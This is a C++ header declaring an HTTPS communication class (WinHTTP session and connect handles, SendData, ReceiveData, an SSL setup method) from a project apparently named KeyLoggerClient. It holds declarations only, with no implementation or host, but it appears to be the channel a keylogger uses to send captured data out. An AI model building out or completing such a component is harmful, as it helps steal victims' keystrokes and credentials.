// KeyLoggerClient/include/communication/HttpsComms.h
#ifndef HTTPSCOMMS_H
#define HTTPSCOMMS_H

#include "communication/BaseComms.h"
#include <vector>
#include <cstdint>
#include <windows.h>
#include <winhttp.h>

class Configuration;

class HttpsComms : public BaseComms {
public:
    explicit HttpsComms(Configuration* config);
    ~HttpsComms() override;
    
    bool Initialize() override;
    bool SendData(const std::vector<uint8_t>& data) override;
    void Cleanup() override;
    [[nodiscard]] bool TestConnection() const override;
    std::vector<uint8_t> ReceiveData() override;
    
private:
    Configuration* m_config;
    HINTERNET m_hSession;
    HINTERNET m_hConnect;
    
    bool ConfigureSslWindows();
};

#endif